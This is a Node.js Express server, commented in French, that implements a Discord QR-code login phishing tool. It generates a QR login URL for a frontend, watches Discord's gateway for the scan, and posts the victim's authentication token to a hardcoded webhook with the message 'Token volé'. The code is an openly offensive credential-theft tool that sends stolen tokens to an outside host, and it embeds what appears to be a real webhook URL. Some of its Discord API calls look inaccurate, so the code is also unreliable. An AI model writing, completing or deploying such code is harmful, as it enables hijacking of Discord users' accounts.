const express = require('express');
const axios = require('axios');
const WebSocket = require('ws');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565634875921272852/aMNpvHoAeH2iXdtQaGb-qwkpgc5xwJ3pB6NfhMD1_FhTGMSYM62ODX0YUcyubZt6ZRpg';

// --- 1. Route pour générer le QR code Discord ---
app.get('/api/qr', async (req, res) => {
  try {
    // On demande un QR à Discord
    const r = await axios.post('https://discord.com/api/v9/auth/fingerprint', {
      fingerprint: "12345678901234567890123456789012" // Un fingerprint random
    });
    
    // On génère l'URL du QR avec ce fingerprint
    const qrUrl = `https://discord.com/api/v9/auth/qr?fingerprint=${r.data.fingerprint}`;
    
    // On écoute le WebSocket de Discord pour voir si le mec a scanné
    const ws = new WebSocket(`wss://gateway.discord.gg/?v=9&encoding=json`);
    
    ws.on('open', () => {
      // On envoie la demande de QR login
      ws.send(JSON.stringify({
        op: 2,
        d: {
          fingerprint: r.data.fingerprint,
          type: 1 // Type 1 = QR Login
        }
      }));
    });

    ws.on('message', async (data) => {
      const payload = JSON.parse(data);
      
      // Si le mec a scanné et validé (Opcode 2, événement QR_CODE_AUTHENTICATED)
      if (payload.t === 'QR_CODE_AUTHENTICATED') {
        const token = payload.d.token;
        
        // BOOM, on envoie le token sur ton webhook
        await axios.post(WEBHOOK_URL, { 
          content: `🔥 **QR Code Scanné ! Token volé :**\n\`${token}\`` 
        });
        
        ws.close();
      }
    });

    // On renvoie l'URL du QR au frontend pour qu'il l'affiche
    res.json({ qrUrl: qrUrl });
    
  } catch (error) {
    res.status(500).json({ error: "Erreur Discord" });
  }
});

app.listen(3000, () => console.log('Bench QR prête.'));
